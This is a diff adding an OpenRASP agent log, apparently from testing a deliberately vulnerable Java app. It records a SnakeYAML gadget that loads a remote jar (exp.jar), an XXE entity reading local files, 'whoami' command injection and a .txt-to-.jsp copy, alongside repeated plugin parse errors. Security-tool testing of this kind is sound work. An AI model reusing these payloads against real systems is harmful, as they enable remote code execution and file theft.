@@ -1,0 +1,1649 @@
+2024-05-06 23:17:39,902 INFO  [Attach Listener][com.baidu.openrasp.plugin.js.log] [official] OpenRASP official plugin: Initialized, version 2022-0616-0730
+2024-05-06 23:37:51,311 INFO  [Attach Listener][com.baidu.openrasp.plugin.js.log] [official] OpenRASP official plugin: Initialized, version 2022-0616-0730
+2024-05-06 23:38:05,023 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Yaml/yaml.do <native code>:0
+"xml": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://localhost:8888/exp.jar']]]]"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at get_all_parameter (official.js:1397:18)
+    at check_internal (official.js:1451:25)
+    at check_ssrf (official.js:1476:15)
+    at Object.func (official.js:1973:19)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:07,717 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesReadAllBytes.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2133:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:08,260 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesReadAllBytes.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2133:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:08,322 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/fileOutStreamWriteFile.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:08,571 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesReadAllBytes.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2133:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:08,896 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/fileOutStreamWriteFile.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:09,590 INFO  [http-nio-8002-exec-22][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesWrite.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:10,223 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:10,516 INFO  [http-nio-8002-exec-29][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesWrite.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:10,858 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:11,116 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:11,240 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:11,474 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:11,643 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:12,039 INFO  [http-nio-8002-exec-22][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:12,070 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/listFile.do <native code>:0
+"dir": "/usr"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2078:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:12,363 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:12,709 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:12,877 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:13,109 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:13,296 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:13,342 INFO  [http-nio-8002-exec-22][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:13,641 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:13,717 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:13,949 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:13,999 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,044 INFO  [http-nio-8002-exec-29][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,120 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,121 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,153 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,324 INFO  [http-nio-8002-exec-28][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,340 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,354 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,700 INFO  [http-nio-8002-exec-11][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,703 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,716 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,758 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,843 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/ongl.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,918 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/spEL.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,954 INFO  [http-nio-8002-exec-29][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:14,966 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,008 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/mvel.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,119 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,316 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,358 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,502 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,504 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,522 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,565 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,570 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,741 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,803 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,813 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,892 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,893 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:15,967 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/XXE/json/xerces.do <native code>:0
+"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2078:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,048 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,080 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,118 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,184 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,199 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,213 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,218 INFO  [http-nio-8002-exec-28][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,244 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,245 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,291 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,341 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,403 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,421 INFO  [http-nio-8002-exec-5][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,446 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,517 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/XXE/json/dom4j.do <native code>:0
+"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2078:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,585 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,632 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,691 INFO  [http-nio-8002-exec-22][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,743 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,761 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,761 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,767 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,771 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,838 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,866 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:16,929 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,084 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,117 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
